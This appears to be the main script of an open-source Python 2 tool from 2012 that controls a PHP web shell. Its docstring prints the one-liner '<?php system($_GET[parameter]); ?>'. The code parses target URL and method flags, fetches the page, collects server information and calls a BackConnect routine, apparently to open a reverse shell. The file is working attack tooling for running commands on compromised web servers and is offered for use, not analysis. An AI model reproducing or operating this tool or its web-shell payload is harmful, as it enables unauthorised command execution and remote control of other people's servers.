#!/usr/bin/env python

'''
-*- coding: utf-8 -*-
Copyright 2012 Ahmed Shawky @lnxg33k <ahmed@isecur1ty.org>

Command controller for <?php system($_GET[parameter]); ?>

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.
'''

#importing modules
from request_info import request_type
from server_info import serverinfo
from executer import commander
from menu import getargs

if getargs.url:
    if getargs.method == 'post' and not getargs.parameter:
        print '\n[!] Using post method requires --parameter flag, check examples'
        exit(1)
    if getargs.method == 'get' and getargs.parameter:
        print '\n[!] Using get method doesn\'t require --parameter flag, check examples'
        exit(1)
    request_type.get_page_source()
    serverinfo.get_information()
    commander.BackConnect()
